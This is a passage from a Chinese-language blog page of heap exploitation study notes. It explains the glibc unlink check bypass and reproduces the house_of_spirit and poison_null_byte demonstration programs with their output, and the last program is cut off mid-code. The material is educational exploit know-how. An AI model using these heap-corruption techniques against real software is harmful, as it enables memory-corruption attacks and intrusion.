</span></span></span><span class=line><span class=cl><span class=cp>                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                         \
</span></span></span><span class=line><span class=cl><span class=cp>                  }                                                           \
</span></span></span><span class=line><span class=cl><span class=cp>              } else {                                                        \
</span></span></span><span class=line><span class=cl><span class=cp>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                 \
</span></span></span><span class=line><span class=cl><span class=cp>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                 \
</span></span></span><span class=line><span class=cl><span class=cp>              }                                                               \
</span></span></span><span class=line><span class=cl><span class=cp>          }                                                                   \
</span></span></span><span class=line><span class=cl><span class=cp>      }                                                                       \
</span></span></span><span class=line><span class=cl><span class=cp>}
</span></span></span></code></pre></div><p>可以先忽略下面和 large bin 相关的部分，关注开头：首先要求满足两个条件：</p><ul><li><code>(P->fd)->bk == P</code></li><li><code>(P->bk)->fd == P</code></li></ul><p>如果满足，则执行：</p><pre tabindex=0><code>(P-&gt;fd)-&gt;bk = P-&gt;bk
(P-&gt;bk)-&gt;fd = P-&gt;fd
</code></pre><p>这就是普通的双向链表删除结点的操作，不安全的地方在于上面的检查，我们可以伪造堆块来绕过这个检查。</p><p>我们在 chunk0 里伪造 chunk。对于 <code>chunk0_ptr</code>，我们预留 <code>0x10</code> 空间给伪 chunk 的 <code>prev_size</code> 和 <code>chunk_size</code> 字段，此时 <code>chunk0_ptr</code> 就是 <code>fake_chunk</code> 的 chunk 指针。那么其 <code>fd</code> 实际上就是 <code>*(chunk0_ptr + 2)</code>，其 <code>bk</code> 实际上就是 <code>*(chunk0_ptr + 3)</code>。用 <code>_0</code> 后缀表示属于 chunk0 的字段，<code>_f</code> 表示属于伪造 chunk 的字段（从左至右、从下至上为低地址到高地址）：</p><pre tabindex=0><code> ---------------------------- &lt;- chunk1_ptr
| prev_size_1 | chunk_size_1 |
 ----------------------------
| data                       |
 ----------------------------
| fd_f        | bk_f         |
 ----------------------------
| prev_size_f | chunk_size_f |
 ---------------------------- &lt;- chunk0_ptr
| prev_size_0 | chunk_size_0 |
 ----------------------------
</code></pre><p>如果我们让伪造的 <code>fd</code> 指向 <code>&chunk0_ptr - 0x18</code>（<code>0x8</code> 一个单位，即三个单位），那么要找到 <code>(fake_chunk->fd)->bk</code>，就需要计算 <code>(&chunk0_ptr - 0x18) + 0x18 = &chunk0_ptr</code>，这就回到了 <code>fake_chunk</code> 的 chunk 指针上，满足了第一个条件。</p><p>同理，让伪造的 <code>bk</code> 指向 <code>&chunk0_ptr - 0x10</code>，那么它的 <code>fd</code> 就需要把 <code>0x10</code> 加回来，同样回到了 <code>fake_chunk</code> 的 chunk 指针。这样就绕过了 unlink 的检查。</p><p>现在，由于存在堆溢出，我们将 <code>chunk1</code> 的 <code>prev_size</code> 写成我们 <code>fake_chunk</code> 的大小。在例子里 <code>chunk0</code> 大小为 0x90，而 <code>fake_chunk</code> 为 0x80。然后把 <code>chunk1</code> 的 <code>PREV_IN_USE</code> 位置为 0，这样以后再 <code>free(chunk1)</code>，此时分配器就会认为前面有一个空闲的大小为 0x80 的 chunk，也就是我们的 <code>fake chunk</code>，然后触发 <code>unlink(fake_chunk)</code> 来尝试与 <code>chunk1</code> 合并。</p><p>问题在于，我们从头到尾都没有真正释放过 <code>fake chunk</code>，因此它不可能出现在任何 bin 里，而 <code>unlink</code> 却尝试把它从 bin 里拆出来。这时执行链表删除操作，但由于 <code>(P->fd)->bk</code> 和 <code>(P->bk)->fd</code> 是相同的，只有后一句有意义，此时相当于执行了 <code>chunk0_ptr = &chunk0_ptr - 0x18</code>。</p><pre tabindex=0><code> ------------------
| &amp;chunk0_ptr-0x18 |---
 ------------------    |
| ?                |   |
 ------------------    |
| ?                |   |
 ------------------ &lt;---
| ?                |
 ------------------
</code></pre><p>那么同理，如果我们修改 <code>*(chunk0_ptr + 3)</code> 的值为 <code>Hello!~</code>，实际上就等于令 <code>chunk0_ptr</code> 指向 <code>Hello!~</code>，此时修改 <code>*chunk0_ptr</code>，那么 <code>Hello!~</code> 字符串就被覆盖了。</p><h2 id=house_of_spirit class="relative group">house_of_spirit <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#house_of_spirit aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file demonstrates the house of spirit attack.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Calling malloc() once so that it sets up its memory.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=o>*</span><span class=n>a</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>fake_chunks</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=nf>__attribute__</span> <span class=p>((</span><span class=nf>aligned</span> <span class=p>(</span><span class=mi>16</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>fake_chunks</span><span class=p>),</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>9</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x40</span><span class=p>;</span> <span class=c1>// this is the size
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The chunk.size of the *next* fake region has to be sane. That is&gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt;av-&gt;system_mem (&lt;128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fake_chunks</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x1234</span><span class=p>;</span> <span class=c1>// nextsize
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Freeing the overwritten pointer.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now the next malloc will return the region of our fake chunk at %p, which will be %p!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;malloc(0x30): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x30</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>This file demonstrates the house of spirit attack.
Calling malloc() once so that it sets up its memory.
We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.
This region (memory of length: 80) contains two chunks. The first starts at 0x7ffcdc8eeb88 and the second at 0x7ffcdc8eebc8.
This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.
The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt;av-&gt;system_mem (&lt;128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffcdc8eeb88.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffcdc8eeb88, which will be 0x7ffcdc8eeb90!
malloc(0x30): 0x7ffcdc8eeb90
</code></pre><p>这个比较简单，在 <code>fake_chunks</code> 数组里伪造了 fastbin 大小的 chunk，确保当前 <code>chunk_size</code> 和 <code>nextsize</code> 合法后，把 fake chunk 的 mem 指针地址给指针 <code>a</code>，然后 <code>free(a)</code>，这样就使得 fake chunk 进入了 fastbin，下次 <code>malloc</code> 就会返回这个 mem 指针。</p><p>这里的合法是指：</p><ul><li><code>chunk_size</code> 的 <code>IS_MMAPED</code> 为 0</li><li><code>chunk_size</code> 属于 fastbin 范围内</li><li><code>nextsize</code> 大于 <code>2*SIZE_SZ</code>，小于 <code>system_mem</code></li></ul><h2 id=poison_null_byte class="relative group">poison_null_byte <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#poison_null_byte aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;malloc.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Welcome to poison null byte 2.0!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Tested in Ubuntu 14.04 64bit.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This technique can be used when you have an off-by-one into a malloc&#39;ed region with a null byte.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span><span class=o>*</span> <span class=n>a</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span><span class=o>*</span> <span class=n>b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span><span class=o>*</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span><span class=o>*</span> <span class=n>b1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span><span class=o>*</span> <span class=n>b2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span><span class=o>*</span> <span class=n>d</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=o>*</span><span class=n>barrier</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We allocate 0x100 bytes for &#39;a&#39;.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span><span class=o>*</span><span class=p>)</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;a: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>real_a_size</span> <span class=o>=</span> <span class=nf>malloc_usable_size</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Since we want to overflow &#39;a&#39;, we need to know the &#39;real&#39; size of &#39;a&#39; &#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;(it may be more than 0x100 because of rounding): %#x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>real_a_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/* chunk size attribute cannot have a least significant byte with a value of 0x00.
</span></span></span><span class=line><span class=cl><span class=cm>     * the least significant byte of this will be 0x10, because the size of the chunk includes
</span></span></span><span class=line><span class=cl><span class=cm>     * the amount requested plus some amount required for the metadata. */</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span><span class=o>*</span><span class=p>)</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x200</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;b: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span><span class=o>*</span><span class=p>)</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;c: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>barrier</span> <span class=o>=</span>  <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;The barrier is not strictly necessary, but makes things less confusing</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>barrier</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span><span class=o>*</span> <span class=n>b_size_ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=o>*</span><span class=p>)(</span><span class=n>b</span> <span class=o>-</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// added fix for size==prev_size(next_chunk) check in newer versions of glibc
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// this added check requires we are allowed to have null pointers in b (not just a c string)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//*(size_t*)(b+0x1f0) = 0x200;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;In newer versions of glibc we will need to have our updated size inside b itself to pass &#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;the check&#39;chunksize(P) != prev_size (next_chunk(P))&#39;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// which is the value of b.size after its first byte has been overwritten with a NULL byte
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=o>*</span><span class=p>(</span><span class=kt>size_t</span><span class=o>*</span><span class=p>)(</span><span class=n>b</span><span class=o>+</span><span class=mh>0x1f0</span><span class=p>)</span> <span class=o>=</span> <span class=mh>0x200</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// this technique works by overwriting the size metadata of a free chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>free</span><span class=p>(</span><span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;b.size: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>*</span><span class=n>b_size_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;b.size is: (0x200 + 0x10) | prev_in_use</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We overflow &#39;a&#39; with a single null byte into the metadata of &#39;b&#39;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span><span class=p>[</span><span class=n>real_a_size</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=c1>// &lt;--- THIS IS THE&#34;EXPLOITED BUG&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;b.size: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>*</span><span class=n>b_size_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span><span class=o>*</span> <span class=n>c_prev_size_ptr</span> <span class=o>=</span> <span class=p>((</span><span class=kt>uint64_t</span><span class=o>*</span><span class=p>)</span><span class=n>c</span><span class=p>)</span><span class=o>-</span><span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;c.prev_size is %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=o>*</span><span class=n>c_prev_size_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// This malloc will result in a call to unlink on the chunk where b was.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// The added check (commit id: 17f487b), if not properly handled as we did before,
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// will detect the heap corruption now.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// The check is this: chunksize(P) != prev_size (next_chunk(P)) where
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// next_chunk(P) == b-0x10+0x200 == b+0x1f0
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=p>((</span><span class=kt>size_t</span><span class=o>*</span><span class=p>)(</span><span class=n>b</span><span class=o>-</span><span class=mh>0x8</span><span class=p>)),</span> <span class=o>*</span><span class=p>(</span><span class=kt>size_t</span><span class=o>*</span><span class=p>)(</span><span class=n>b</span><span class=o>-</span><span class=mh>0x10</span> <span class=o>+</span> <span class=o>*</span><span class=p>((</span><span class=kt>size_t</span><span class=o>*</span><span class=p>)(</span><span class=n>b</span><span class=o>-</span><span class=mh>0x8</span><span class=p>))));</span>
</span></span><span class=line><span class=cl>    <span class=n>b1</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;b1: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>b1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now we malloc &#39;b1&#39;. It will be placed where &#39;b&#39; was. &#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;At this point c.prev_size should have been updated, but it was not: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=o>*</span><span class=n>c_prev_size_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;before c.prev_size: %lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=o>*</span><span class=p>(((</span><span class=kt>uint64_t</span><span class=o>*</span><span class=p>)</span><span class=n>c</span><span class=p>)</span><span class=o>-</span><span class=mi>4</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We malloc &#39;b2&#39;, our &#39;victim&#39; chunk.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Typically b2 (the victim) will be a structure with valuable pointers that we want to control
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=n>b2</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x80</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;b2: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>b2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>b2</span><span class=p>,</span><span class=sc>&#39;B&#39;</span><span class=p>,</span><span class=mh>0x80</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Current b2 content:</span><span class=se>\n</span><span class=s>%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>b2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now we free &#39;b1&#39; and &#39;c&#39;: this will consolidate the chunks &#39;b1&#39; and &#39;c&#39; (forgetting about&#39;b2&#39;).</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>b1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Finally, we allocate &#39;d&#39;, overlapping &#39;b2&#39;.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>d</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x300</span><span class=p>);</span>
